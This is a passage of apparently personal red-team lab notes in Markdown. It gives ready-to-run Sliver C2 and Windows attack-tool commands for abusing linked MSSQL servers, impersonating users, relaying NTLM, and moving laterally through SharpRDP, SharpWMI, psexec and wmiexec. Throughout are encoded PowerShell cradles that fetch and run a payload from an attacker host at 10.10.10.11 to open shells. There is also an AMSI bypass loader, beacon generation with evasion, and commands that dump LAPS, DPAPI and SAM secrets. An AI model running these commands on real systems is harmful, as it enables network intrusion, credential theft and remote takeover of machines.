execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01 /l:sql02 /action:whoami
execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01:localuser /l:sql02 /action:whoami
execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01:localuser /l:sql03 /action:whoami
execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql01:devUser /l:SQL02,sql01 /a:whoami


# Impersonating users across link - sql01 -> sql03 -> sql02
execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01:localuser /l:SQL03:localAccount,SQL02:localGroup /action:whoami


# Get sliver shell
execute-assembly -t 40 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01:webapp11 /l:sql27 /action:pwshdl '10.10.10.11/hav0c-ps.txt'
execute-assembly -t 40 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:local /u:localuser /p:password /h:sql01:webapp11 /l:sql53 /action:pwshdl '10.10.10.11/hav0c-ps.txt'
execute-assembly -t 40 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql01:devUser /l:SQL02,sql01 /a:pwshdl "10.10.10.11/hav0c-ps.txt"
execute-assembly -t 40 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql01:devUser /l:SQL02,sql01,SQL02 /a:pwshdl "10.10.10.11/hav0c-ps.txt"


# Search Databases (within link)
execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql01:devUser /l:SQL02,sql01,SQL02 /a:databases


# Search strings in databases (with spaces, for each string)
execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql01:devUser /l:SQL02,sql01,SQL02 /a:search wordpress
execute-assembly -t 20 /home/kali/tools/bins/csharp-files/MSSQLand.exe /c:token /h:sql01:devUser /l:SQL02,sql01,SQL02 /a:search wordpress admin
```




### MSSQLpwner

```powershell
# Try and check permissions as different users - PTH and creds
mssqlpwner domain.com/domainuser:8b1B0BzGvj9J@10.10.100.15 -windows-auth interactive enumerate
mssqlpwner ./Administrator@10.10.100.15 -hashes ':ffffffffffffffffffffffffffffffff' -windows-auth interactive enumerate
mssqlpwner domain.com/machine01\$@10.10.100.15 -hashes ':ffffffffffffffffffffffffffffffff' -windows-auth interactive enumerate


# For local authentication
mssqlpwner localuser:password@10.10.200.130 interactive enumerate


# Run command on the link
mssqlpwner localuser:password@10.10.200.130 -link-name SQL01 exec hostname
mssqlpwner localuser:password@10.10.200.130 -link-name SQL02 exec hostname
mssqlpwner localuser:password@10.10.200.130 -link-name SQL03 exec hostname
mssqlpwner dev.domain.com/machine01\$@10.10.200.131 -hashes ':ffffffffffffffffffffffffffffffff' -windows-auth -link-name SQL04 exec hostname


# Get reverse shell
mssqlpwner localuser:password@10.10.200.130 -link-name SQL03 exec 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='


# Use specific link
mssqlpwner -hashes ':ffffffffffffffffffffffffffffffff' ./Administrator@10.10.200.131 -windows-auth -link-name sql03 enumerate interactive


# Get the chain list accessible
get-chain-list


# Set chain to that of dba access on a linked machine
set-chain c99e9ea1-6f06-4f85-85b0-4b65d11d4a3a


# Run command on the selected chain
exec "whoami /all"


# Sliver session
exec 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='
```


### SQLRecon

> I don't like using this as impersonation across links is not supported by SQLRecon

```powershell
# Enumerate spn
sqlrecon -- /enum:sqlspns


# Whoami
sqlrecon -- /auth:wintoken /h:sql01 /m:whoami
sqlrecon -- /auth:Local /u:localuser /p:password /h:sql01 /m:whoami


# Info of server
sqlrecon -- /auth:Local /u:localuser /p:password /h:sql01 /module:info


# Who can we impersonate? 
sqlrecon -- /auth:Local /u:localuser /p:password /h:sql01 /m:impersonate


# Impersonation - Fails
sqlrecon -- /auth:Local /u:localuser /p:password /h:sql01 /m:whoami /i:sa


# Current user
execute-assembly /home/kali/tools/bins/csharp-files/SQLRecon.exe '/a:wintoken /h:sql01 /m:query /command:"select SYSTEM_USER"'


# Enable XpCMDShell
sqlrecon -- /a:wintoken /h:sql01 /m:enablexp


# Command Execution
sqlrecon -- /a:wintoken /h:sql01 /m:xpcmd /i:sa /c:ipconfig


# Get shell through sql01
inline-execute-assembly -t 20 /home/kali/tools/bins/csharp-files/SQLRecon.exe '/a:wintoken /h:sql01 /m:xpcmd /c:"powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=="'


# Enumerate links
sqlrecon -- /a:wintoken /h:sql01 /m:links
```


#### Links Exploitation

The links exploitation of SQLRecon is limited. Use MSSQLand to ease the process and to impersonate user across multiple links.

```powershell
# Links & Crawling - https://github.com/skahwah/SQLRecon/wiki/5.-Linked-Modules
# Essentially, its just adding /l:server and then rest of the query is same as before
# Enumerate links
sqlrecon -t 20 -- /auth:Local /u:localuser /p:password /h:sql01 /m:links


# Run SQL queries on the linked server
sqlrecon -- '/auth:Local /u:localuser /p:password /h:sql01 /m:query /command:"SELECT srvname, srvproduct, rpcout FROM master..sysservers"'


# Run further modules to get info/whoami/user and server name
sqlrecon -t 20 -- '/auth:Local /u:localuser /p:password /h:sql01 /l:sql02 /m:info'
sqlrecon -t 20 -- '/auth:Local /u:localuser /p:password /h:sql01 /l:sql02 /m:whoami'
sqlrecon -t 20 -- '/auth:Local /u:localuser /p:password /h:sql01 /l:sql02 /m:query /c:"select @@servername"'
sqlrecon -t 20 -- '/auth:Local /u:localuser /p:password /h:sql01 /l:sql02 /m:query /c:"select SYSTEM_USER"'


# Check RPC enabled
sqlrecon -t 20 -- /auth:Local /u:localuser /p:password /h:sql01 /l:sql02 /m:checkrpc
sqlrecon -t 20 -- /auth:Local /u:localuser /p:password /h:sql01 /l:sql03 /m:checkrpc


# Enable xpcmd
sqlrecon -t 20 -- /auth:Local /u:localuser /p:password /h:sql01 /l:sql02 /m:enablexp
sqlrecon -t 20 -- /auth:Local /u:localuser /p:password /h:sql01 /l:sql03 /m:enablexp


# Shell for sql02
inline-execute-assembly -t 50 /home/kali/tools/bins/csharp-files/SQLRecon.exe '/auth:Local /u:localuser /p:password /h:sql01 /l:sql02 /m:xpcmd /c:"powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=="'
```


#### MSSQL - Relaying & Impersonation

Really good article on relaying to MSSQL
- https://lsecqt.github.io/Red-Teaming-Army/active-directory/compromising-mssql-databases-by-relaying/


```powershell
# We get callback from attacker user account from sql01
sqlrecon -i -- /a:wintoken /h:sql01 /m:smb /unc:\\\\10.10.10.11\\testpath

ffffffffffffffffffffffffffffffff

# We get the following hash
[SMB] NTLMv2-SSP Client   : 192.168.10.30
[SMB] NTLMv2-SSP Username : domain\user
[SMB] NTLMv2-SSP Hash     : attacker::domain:f73cde60c9c0edd4:...:010100000.....


# Attempt to crack the hash received within responder
hashcat -m 5600 attacker.hash /usr/share/wordlists/rockyou.txt --force


# Write all hosts into the file and relay to all
sudo impacket-ntlmrelayx --no-http-server -smb2support -tf hosts.txt -c 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='


# Relaying to single host and executing command if authentication succeeds
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 172.16.100.110 -c 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='


# We can also try impacket-mssqlclient for relaying and authentication
sudo proxychains impacket-ntlmrelayx --no-http-server -smb2support -t mssql://172.16.100.110 -c 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='
```




### PowerUPSQL

> Backup if everything fails

```powershell
# Open powershell shell
shell


# Load the scripts 
IEX(New-Object Net.webclient).downloadString("http://10.10.10.11/powershell-scripts/amsi.txt")
IEX(New-Object Net.webclient).downloadString("http://10.10.10.11/powershell-scripts/PowerUpSQL.ps1")
IEX(New-Object Net.webclient).downloadString("http://10.10.10.11/powershell-scripts/Inveigh.ps1")


# Run SQL Queries for enumeration
Get-SQLQuery -Instance "192.168.130.10" -Query "select @@servername"
Get-SQLQuery -Instance "192.168.130.10" -Query "SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;"
Get-SQLQuery -Instance "192.168.130.10" -Query "EXECUTE AS login = 'webuser'; SELECT SYSTEM_USER;"


# Escalate privs using impersonation and run command
Invoke-SQLEscalatePriv -Verbose -Instance 192.168.130.10
Invoke-SQLOSCmd -Instance 192.168.130.10 -Command "whoami"


# Run SQL Queries for checking impersonation
Get-SQLQuery -Instance "192.168.130.10" -Query "SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;"


# UNC Lookup
Invoke-SQLUncPathInjection -Instance 192.168.130.10 -Verbose -CaptureIp 10.10.10.11
```



## Armory


### SharpLaps

```powershell
sharplaps /host:DC06 /target:machine06
sharplaps /host:DC06 /target:client
```



### SharpView

```powershell
sharpview -- 'Get-DomainComputer -Properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime'
sharpview -- 'Get-DomainComputer -Identity machine03.domain.com -Properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime'
```



### SharpHound

Better to use the version from GitHub, the above one is outdated

```powershell
sharp-hound-4
sharp-hound-4 -- '-C all'
```



### SharpSecDump

Port of impacket-secretsdump but within C# - handy.

```powershell
sharpsecdump -- -target=machine02.domain.com -u=Administrator -d=. -p='password'
```




### sharpsh

```powershell
sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainComputer machine03.domain.com"'
sharpsh -t 20 -- '-u http://10.10.10.11/powershell-scripts/PowerView.ps1 -c "Get-DomainComputer machine02.domain.com"'

sharpsh -- -c '$ExecutionContext.SessionState.LanguageMode'
sharpsh -- '-c "whoami /all"'
```



### SharpMapExec

Whole description -> https://github.com/cube0x0/SharpMapExec

```powershell
# Enable WinRM
sharpmapexec -- 'ntlm winrm /user:Administrator /password:"password" /domain:. /computername:machine02.domain.com /m:enable_winrm'
```



### SharpUp


```powershell
sharpup
sharpup audit
```



### SharpRDP

> Works through the RDP portal if or when SMB and other ports are turned off.

```powershell
# Sliver - Powershell works but after line fails
execute-assembly -t 50 /home/kali/tools/bins/csharp-files/SharpRDP.exe computername=hostname01 command="powershell IEX((new-object net.webclient).downloadstring('http://10.10.10.11/hav0c-ps.txt'))" username=corp1\\user password=password
sharprdp -- computername=machine06 username=Administrator password=password command=notepad


# This works, generate beacon and upload on host
generate beacon --http 10.10.10.11:8088 --name sliver.beacon --os windows --seconds 5 --jitter 0 --evasion --save /home/kali/OSEP/hav0c/


# Upload on host
make-token -d . -u Administrator -p 'password'
upload /home/kali/OSEP/hav0c/sliver.beacon.exe //machine06/c$/windows/temp/sliver2.beacon.exe
ls //machine06/c$/windows/temp/


# Execute using sharprdp
sharprdp -- computername=machine06 password=password username=Administrator command=C:\\Windows\\Temp\\sliver2.beacon.exe
```




### Rubeus

```powershell
rubeus -- tgtdeleg /nowrap
rubeus -t 30 -- monitor /interval:5 /runfor:15 /nowrap
```



### NoPowerShell

> Limited cmdlets supported, use the second command to see the list

- https://github.com/bitsadmin/nopowershell
- https://github.com/bitsadmin/nopowershell/blob/master/CHEATSHEET.md

```powershell
nps 'Get-ADUser -Filter *'
nps Get-Command
```



### Sharp-SMBExec

```powershell
Sharp-SMBExec.exe hash:"hash" username:"username" domain:"domain.tld" target:"target.domain.tld" command:"command"

sharp-smbexec hash:"ffffffffffffffffffffffffffffffff" username:"Administrator" domain:"infinity.com" target:"machine02.domain.com" command:"ls"
```




### SharpDPAPI

```powershell
SharpDPAPI.exe masterkeys /pvk:key.pvk

sharpdpapi masterkeys /hashes:ffffffffffffffffffffffffffffffff

sharpdpapi credentials
sharpdpapi vaults

sharpdpapi machinemasterkeys
```



### SharpWMI

```powershell
sharp-wmi 

make-token -d . -u Administrator -p 'password'
sharp-wmi action=exec computername=machine02.domain.com command=C:\\Windows\\Temp\\sliver2.beacon.exe result=true amsi=disable


runas -d . -u Administrator -P 'password' -n -p C:\\Windows\\tasks\\sliver.beacon.exe




upload /home/kali/OSEP/hav0c/sliver.beacon.exe //machine06/c$/windows/temp/sliver2.beacon.exe
ls //machine06/c$/windows/temp/


# Execute using sharprdp
sharprdp -- computername=machine06 password='password' username=Administrator command=C:\\Windows\\Temp\\sliver2.beacon.exe

```




## BOFs

### jump-psexec

```powershell
jump-psexec dc04 AgentSvc /home/kali/OSEP/hav0c/sliver.x64.exe //dc04/c$/file2.exe
```


### jump-wmiexec

```powershell
jump-wmiexec client09 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='
```


